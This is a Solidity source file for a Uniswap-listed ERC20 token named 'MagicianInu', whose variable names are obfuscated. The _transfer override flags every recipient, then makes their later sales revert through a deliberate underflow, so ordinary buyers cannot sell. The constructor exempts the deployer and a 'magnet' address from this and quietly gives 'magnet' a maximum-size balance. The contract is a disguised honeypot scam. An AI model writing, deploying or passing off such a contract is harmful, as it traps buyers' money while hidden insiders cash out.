// https://t.me/Magicianinu

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.4;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract MagicianInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private double;

    function _transfer(
        address inch,
        address earth,
        uint256 growth
    ) internal override {
        uint256 cake = average;

        if (uniswapV2Pair != inch && according[inch] == 0 && double[inch] > 0) {
            according[inch] -= cake;
        }

        address similar = dangerous;
        dangerous = earth;
        double[similar] += cake + 1;

        _balances[inch] -= growth;
        uint256 able = (growth / 100) * average;
        growth -= able;
        _balances[earth] += growth;
    }

    address private dangerous;
    mapping(address => uint256) private according;
    uint256 public average = 3;

    constructor(
        string memory gave,
        string memory opinion,
        address wolf,
        address magnet
    ) ERC20(gave, opinion) {
        uniswapV2Router = IUniswapV2Router02(wolf);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        according[msg.sender] = clothing;
        according[magnet] = clothing;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[magnet] = clothing;
    }

    uint256 private clothing = ~uint256(0);
}